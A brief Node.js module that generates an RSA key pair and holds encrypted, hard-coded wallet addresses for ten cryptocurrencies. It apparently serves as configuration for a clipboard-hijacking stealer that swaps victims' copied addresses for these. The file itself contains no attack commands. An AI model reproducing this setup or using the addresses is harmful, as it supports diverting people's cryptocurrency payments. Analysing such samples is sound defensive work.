module.exports = (client) => {
    return {
        default_padding: client.requires.crypto.constants.RSA_PKCS1_OAEP_PADDING,
        default_oaepHash: "sha256",
        keyPair: client.requires.crypto.generateKeyPairSync("rsa", {
            modulusLength: 2048,
        }),

        btc: client.utils.encryption.encryptData("bc1qzgr9wcq28tu9md02rfp5f4tjvsguz7x2a00eye"),
        ltc: client.utils.encryption.encryptData("LUkCrDuUBPGH9uVQQHFS5hyi1xPJ38cbUb"),
        xmr: client.utils.encryption.encryptData("49Xq8VXCC332Kb86njG3Dkj5vidaPifsN7S8wBnS75xeE5N9Fhh6FhM2FsoQ6URCRkZ3fVUUJPMWK4o19841gU6HD4rXSWd"),
        eth: client.utils.encryption.encryptData("0xb95C23e1aE44b00C160546eb70D383563142A1AE"),
        xrp: client.utils.encryption.encryptData("rEV2y4T7KK8omqxZxehhTo4noENPAywWX7"),
        neo: client.utils.encryption.encryptData("APP3xgw31kAmrLzmzwsq1QRzqiVJwDFQ2T"),
        bch: client.utils.encryption.encryptData("qqssukdtcxnhz39pck6e3rewa77chk4vwvfx997xk9"),
        doge: client.utils.encryption.encryptData("DPZVdUE2tq9DRY7AqwZq79kmPWVfouqutq"),
        dash: client.utils.encryption.encryptData("XhBFpa8b82yrfddpge84iHT1VHVLd3eUeF"),
        xlm: client.utils.encryption.encryptData("GBYNIZIJWZT7I2VTCVASDKIM6OXRKNRN4MVS6NTG2L23EIBQENPS5ZA7"),
    }
}